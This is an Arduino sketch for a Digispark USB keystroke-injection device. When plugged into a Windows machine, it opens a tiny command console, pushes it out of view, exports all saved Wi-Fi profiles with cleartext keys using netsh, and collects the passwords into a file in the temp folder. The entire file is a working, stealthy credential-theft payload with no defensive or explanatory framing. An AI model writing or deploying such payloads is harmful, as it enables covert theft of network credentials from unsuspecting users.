#include <DigiKeyboard.h>

#define KEY_DOWN 0x51

void dead_command_console(){
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cmd /k mode con: cols=15 line=1");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_M);

  for (int i = 0; i < 100; i++){
    DigiKeyboard.sendKeyStroke(KEY_DOWN);
  }
  wifi_key_theft();
}

void wifi_key_theft(){
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cd %temp%");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("netsh wlan export profile key=clear");
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("powershell Select-String -Path Wi-Fi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS");
  DigiKeyboard.delay(1000);

}

void setup() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);

  dead_command_console();

}

void loop() {

}
